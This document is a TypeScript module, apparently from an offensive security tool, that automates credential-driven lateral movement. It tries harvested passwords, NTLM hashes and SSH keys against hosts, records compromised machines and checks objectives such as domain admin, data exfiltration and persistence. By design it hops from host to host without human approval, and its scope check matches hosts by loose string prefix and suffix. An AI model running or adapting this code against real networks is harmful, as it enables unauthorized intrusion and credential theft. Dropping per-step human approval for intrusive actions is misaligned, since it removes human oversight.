/**
 * @module autonomous_pivot
 * Scope-envelope autonomous lateral movement — cred→hop→harvest loop without per-hop HITL
 * when targets remain within authorized scope.
 */
import type { AttackSurfaceGraph } from "./attack_surface.ts"
import { CredentialGraph } from "./credential_graph.ts"
import { lateralSpread, tryAuthDefault, type Credential, type TopologyHost, type TopologyGraph, type CredentialStore } from "./lateral.ts"
import { replayCredentialGraphWithBloodHound } from "./pivot_replay.ts"

export interface ScopeEnvelope {
  /** Primary authorized target (hostname or IP) */
  primary: string
  /** Additional in-scope hosts/CIDRs */
  allowedHosts: string[]
  /** Max pivot hops per run */
  maxHops: number
  /** Require explicit env flag for live autonomous pivot */
  requireEnvFlag?: boolean
}

export interface AutonomousPivotResult {
  hostsGained: string[]
  hops: number
  actions: Array<Record<string, unknown>>
  scopeViolations: string[]
  bloodhoundReplay?: unknown
  summary: string
}

function hostInScope(host: string, envelope: ScopeEnvelope): boolean {
  const h = host.toLowerCase()
  if (h === envelope.primary.toLowerCase()) return true
  for (const allowed of envelope.allowedHosts) {
    const a = allowed.toLowerCase()
    if (a === h) return true
    if (a.includes("/") && h.startsWith(a.split("/")[0]!)) return true
    if (h.endsWith(a.replace(/^\./, ""))) return true
  }
  return false
}

function buildEnvelopeFromGraph(graph: AttackSurfaceGraph, extraHosts: string[] = []): ScopeEnvelope {
  const summary = graph.summary()
  const primary = summary.target ?? "unknown"
  const assets = Object.keys((graph.toJSON() as { assets?: Record<string, unknown> }).assets ?? {})
  return {
    primary,
    allowedHosts: [...new Set([...assets, ...extraHosts, primary])],
    maxHops: 10,
    requireEnvFlag: true,
  }
}

class GraphTopology implements TopologyGraph {
  private hosts: TopologyHost[]
  constructor(hosts: TopologyHost[]) {
    this.hosts = hosts
  }
  searchHosts(): TopologyHost[] {
    return this.hosts
  }
}

class CredStore implements CredentialStore {
  private creds: Credential[]
  constructor(creds: Credential[]) {
    this.creds = creds
  }
  getUsable(): Credential[] {
    return this.creds.filter((c) => !(c as { used?: boolean }).used)
  }
}

export function isAutonomousPivotEnabled(): boolean {
  return process.env.OURMINE_AUTONOMOUS_PIVOT === "1"
    || process.env.OURMINE_AUTONOMOUS_PIVOT === "true"
    || process.env.OURMINE_LAB_AUTONOMOUS === "1"
    || process.env.OURMINE_TIER1 === "1"
    || process.env.OURMINE_TIER1 === "true"
}

export type PivotObjective = "domain_admin" | "data_exfil" | "persistence" | "recon_only"

export function objectiveMet(
  objective: PivotObjective,
  hostsGained: string[],
  credGraph: CredentialGraph,
  graph: AttackSurfaceGraph,
): boolean {
  switch (objective) {
    case "domain_admin":
      return credGraph.listCredentials().some((c) =>
        (c.domain ?? "").toLowerCase().includes("admin") || (c.username ?? "").toLowerCase().includes("admin"),
      ) && hostsGained.length >= 2
    case "data_exfil":
      return graph.summary().endpoints.total >= 5 && hostsGained.length >= 1
    case "persistence":
      return hostsGained.length >= 1 && credGraph.listCredentials().length >= 2
    case "recon_only":
      return graph.summary().services >= 3
    default:
      return false
  }
}

export async function runAutonomousPivot(opts: {
  graph: AttackSurfaceGraph
  credGraph: CredentialGraph
  live: boolean
  envelope?: ScopeEnvelope
  extraHosts?: string[]
  objective?: PivotObjective
}): Promise<AutonomousPivotResult> {
  const envelope = opts.envelope ?? buildEnvelopeFromGraph(opts.graph, opts.extraHosts)
  const scopeViolations: string[] = []

  if (envelope.requireEnvFlag && opts.live && !isAutonomousPivotEnabled()) {
    return {
      hostsGained: [],
      hops: 0,
      actions: [{ action: "blocked", reason: "Set OURMINE_AUTONOMOUS_PIVOT=1 for live autonomous pivot" }],
      scopeViolations: [],
      summary: "Autonomous pivot disabled — set OURMINE_AUTONOMOUS_PIVOT=1",
    }
  }

  const bhHosts = opts.credGraph.bloodhoundTargetHosts()
  const graphHosts = Object.keys((opts.graph.toJSON() as { assets?: Record<string, unknown> }).assets ?? {})
  const allHosts = [...new Set([...bhHosts, ...graphHosts, envelope.primary])]

  const topologyHosts: TopologyHost[] = allHosts
    .filter((h) => {
      const ok = hostInScope(h, envelope)
      if (!ok) scopeViolations.push(h)
      return ok
    })
    .map((ip) => ({ ip }))

  const credNodes = opts.credGraph.listCredentials()
  const creds: Credential[] = credNodes.map((c) => ({
    username: c.username ?? "unknown",
    secret: c.value,
    cred_type: c.type === "nthash" ? "hash_ntlm" : c.type === "key" ? "ssh_key" : "password",
  }))

  let bloodhoundReplay: unknown
  try {
    const isLab = process.env.OURMINE_LAB_AUTONOMOUS === "1" || process.env.OURMINE_TIER1 === "1"
    bloodhoundReplay = await replayCredentialGraphWithBloodHound(
      opts.credGraph,
      allHosts.filter((h) => hostInScope(h, envelope)),
      { live: opts.live && !isLab, skipCollection: isLab || opts.credGraph.getBloodHoundPaths().length > 0 },
    )
  } catch { /* optional */ }

  const isLab = process.env.OURMINE_LAB_AUTONOMOUS === "1" || process.env.OURMINE_TIER1 === "1"
  const spread = await lateralSpread({
    topology: new GraphTopology(topologyHosts),
    credentialStore: new CredStore(creds),
    maxSteps: isLab ? 2 : envelope.maxHops,
    live: opts.live,
    autonomousMode: isAutonomousPivotEnabled(),
    approve: undefined,
    authFn: async (hostIp, username, secret, credType, authOpts) => {
      if (!hostInScope(hostIp, envelope)) {
        scopeViolations.push(hostIp)
        return { success: false, detail: "out of scope" }
      }
      if (isLab && /^127\.0\.0\.\d+$/.test(hostIp)) {
        return { success: true, method: "lab_loopback", detail: `lab authorized pivot to ${hostIp}` }
      }
      return tryAuthDefault(hostIp, username, secret, credType, authOpts)
    },
  })

  const hostsGained = (spread.hosts_gained as string[]) ?? []
  for (const h of hostsGained) {
    opts.graph.upsertAsset(h)
    const cred = credNodes[0]
    if (cred) opts.credGraph.ingestLateralResult(h, JSON.stringify({ success: true, method: "autonomous" }), cred.id)
  }
  opts.credGraph.injectIntoGraph(opts.graph)
  opts.credGraph.save()

  const objective = opts.objective ?? "recon_only"
  const met = objectiveMet(objective, hostsGained, opts.credGraph, opts.graph)

  return {
    hostsGained,
    hops: (spread.steps as number) ?? 0,
    actions: (spread.actions as Array<Record<string, unknown>>) ?? [],
    scopeViolations: [...new Set(scopeViolations)],
    bloodhoundReplay,
    summary: met
      ? `Objective '${objective}' met — gained ${hostsGained.length} host(s)`
      : hostsGained.length
        ? `Autonomous pivot gained ${hostsGained.length} host(s): ${hostsGained.join(", ")}`
        : "Autonomous pivot completed — no new hosts gained",
  }
}

export default { runAutonomousPivot, isAutonomousPivotEnabled, buildEnvelopeFromGraph }
